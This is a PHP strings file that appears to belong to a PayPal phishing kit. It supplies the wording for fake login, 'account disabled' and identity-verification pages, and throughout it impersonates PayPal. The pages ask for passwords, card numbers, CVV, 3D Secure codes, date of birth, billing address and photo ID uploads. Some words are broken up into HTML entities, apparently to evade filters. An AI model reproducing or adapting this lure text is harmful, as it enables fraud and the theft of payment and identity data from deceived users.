<?php
// login
$lang_01 = "Lo&#103;&#105;&#110;&#32;&#84;&#111;&#32;&#67;&#111;&#110;&#116;&#105;nue";
$lang_02 = "Some of your info isn't correct. Please try again.";
$lang_03 = "Not you?";
$lang_04 = "Email is required";
$lang_05 = "Next";
$lang_06 = "Show";
$lang_07 = "Hide";
$lang_08 = "Enter your password.";
$lang_09 = "Log In";
$lang_10 = "Having trouble logging in?";
$lang_11 = "Privacy";
$lang_12 = "or";
$lang_13 = "Sign Up";
$lang_14 = "Contact Us";
$lang_15 = "Enter your password";
$lang_16 = "Email address";
// information
$lang_17 = "Please Co&#109;&#112;&#108;&#101;&#116;&#101;&#32;&#119;&#105;&#116;&#104;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#110;&#102;ormations";
$lang_18 = "Identity verification";
$lang_00 = "One last step to confirm that you are the owner of this account.";
$lang_19 = "This card is not accepted. Please use a different card.";
$lang_20 = "Full Name";
$lang_21 = "Card number";
$lang_22 = "Expiration MM/YY";
$lang_23 = "CVV 3 digits";
$lang_24 = "Confirm";
$lang_25 = "This Account has been disabled for security reasons.";
$lang_26 = "To enable your account, verify your information , or not your account will be automatically deleted from the system";
$lang_27 = "Unlock Account";
$lang_2c = "Close";
$lang_2d = "Add New Card";
// billing
$lang_28 = "Please Co&#109;&#112;&#108;&#101;&#116;&#101;&#32;&#119;&#105;&#116;&#104;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#110;&#102;ormations";
$lang_29 = "Add Billing Address";
$lang_3f = "Full Name";
$lang_30 = "Select Your Country";
$lang_31 = "Address line";
$lang_32 = "City";
$lang_33 = "Province / Region";
$lang_34 = "Code Zip";
$lang_35 = "Phone number";
$lang_36 = "+ Add New Card";
$lang_37 = "Confirm";
// vbv
$lang_38 = "Please check your entries and try again";
$lang_39 = "processing ...";
$lang_40 = "Name of cardholder :";
$lang_41 = "Date Of &Beta;irth :";
$lang_42 = "DD";
$lang_43 = "MM";
$lang_44 = "YYYY";
$lang_45 = "Card Number :";
$lang_46 = "CVV/CVC :";
$lang_47 = "3D Secure :";
$lang_48 = "&copy; <script>document.write(new Date().getFullYear());</script> Bank check.All Rights Reserved";
$lang_49 = "Submit";
$lang_50 = "Please enter information pertaining to your credit card to add it in your PayPal account";
 // ID
$lang_51 = "Confirm Your identity";
$lang_52 = "please upload only image type file (jpg gif png)";
$lang_53 = "Confirm Your identity";
$lang_54 = "Change your photo";
$lang_55 = "Select your Photo";
$lang_56 = "Submit";
$lang_57 = "upload failed .Please try again";
$lang_58 = "or";
 // THanks
$lang_59 = "Thank You";
$lang_60 = "success";
$lang_61 = "Thank you for taking the steps to restore your account access. Your patience and efforts increase security for our entire community of users.";
$lang_62 = "PayPal takes the safety of your account, business and financial data as seriously as you do, and these ongoing checks of our system contribute to our high level of security.";
 // THanks

?>
